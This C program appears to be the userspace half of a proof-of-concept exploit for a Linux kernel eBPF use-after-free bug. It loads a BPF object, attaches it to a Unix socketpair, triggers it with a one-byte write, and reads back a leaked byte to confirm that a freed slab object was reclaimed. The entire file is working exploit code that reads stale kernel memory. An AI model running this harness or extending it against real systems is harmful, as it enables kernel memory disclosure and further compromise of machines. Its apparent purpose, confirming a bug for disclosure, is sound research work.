#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>

int main(int argc, char **argv)
{
	const char *obj_path = "poc_uaf_reuse.bpf.o";
	struct bpf_object *obj;
	struct bpf_program *prog;
	int prog_fd;
	struct bpf_map *data_map, *results_map;
	int data_fd, results_fd;
	__u32 k1 = 1, k0 = 0, k2 = 2, k3 = 3;
	__u64 val;

	obj = bpf_object__open_file(obj_path, NULL);
	if (libbpf_get_error(obj)) {
		fprintf(stderr, "Failed to open BPF object\n");
		return 1;
	}
	if (bpf_object__load(obj)) {
		fprintf(stderr, "BPF load failed: %s\n", strerror(errno));
		return 1;
	}
	printf("[+] BPF program loaded\n");

	prog = bpf_object__find_program_by_name(obj, "poc_uaf_reuse");
	if (!prog) { fprintf(stderr, "Program not found\n"); return 1; }
	prog_fd = bpf_program__fd(prog);

	data_map = bpf_object__find_map_by_name(obj, "data_map");
	if (!data_map) { fprintf(stderr, "data_map not found\n"); return 1; }
	data_fd = bpf_map__fd(data_map);
	val = 0;
	bpf_map_update_elem(data_fd, &k1, &val, BPF_ANY);  // pre‑populate key=1

	results_map = bpf_object__find_map_by_name(obj, "results");
	if (!results_map) { fprintf(stderr, "results map not found\n"); return 1; }
	results_fd = bpf_map__fd(results_map);

	int socks[2];
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0) {
		perror("socketpair");
		return 1;
	}
	if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0) {
		perror("SO_ATTACH_BPF");
		close(socks[0]); close(socks[1]);
		return 1;
	}
	printf("[+] Attached to socket\n");

	printf("[*] Triggering UAF with reuse...\n");
	char trigger = 'X';
	if (write(socks[1], &trigger, 1) < 1) {
		perror("write");
	}
	sleep(1);

	// Check sentinel
	if (bpf_map_lookup_elem(results_fd, &k3, &val) || val != 0xdeadbeef) {
		fprintf(stderr, "[-] Program did not run correctly (sentinel: 0x%llx)\n",
			(unsigned long long)val);
		return 1;
	}

	__u8 leaked_byte;
	bpf_map_lookup_elem(results_fd, &k0, &val);
	leaked_byte = (__u8)val;
	printf("[*] Leaked byte (key=0): 0x%x\n", leaked_byte);

	bpf_map_lookup_elem(results_fd, &k1, &val);
	printf("[*] val1 content (key=1): 0x%llx\n", (unsigned long long)val);

	bpf_map_lookup_elem(results_fd, &k2, &val);
	printf("[*] new_val content (key=2): 0x%llx\n", (unsigned long long)val);

	printf("\n=== VERDICT ===\n");
	if (leaked_byte == 0x51) {
		printf("[+] CONFIRMED: Stale slice read the reallocated object (0x51).\n");
		printf("    Freed slab was reclaimed by key=2, proving dangling pointer UAF.\n");
	} else {
		printf("[-] Leaked byte 0x%x does not match the reallocated pattern (0x51).\n", leaked_byte);
		printf("    Try running again or on a system with KASAN for stronger evidence.\n");
	}

	close(socks[0]);
	close(socks[1]);
	bpf_object__close(obj);
	return 0;
}
